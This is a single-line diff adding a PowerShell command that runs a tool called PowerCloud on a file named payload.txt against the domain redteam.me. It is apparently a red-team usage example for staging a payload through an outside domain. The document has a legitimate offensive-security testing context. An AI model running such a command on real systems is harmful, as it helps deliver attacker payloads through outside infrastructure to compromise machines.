@@ -1,0 +1,1 @@
+PS C:\tools\powercloud> . .\powercloud.ps1; Invoke-PowerCloud -FilePath .\payload.txt -Domain redteam.me -Verbose
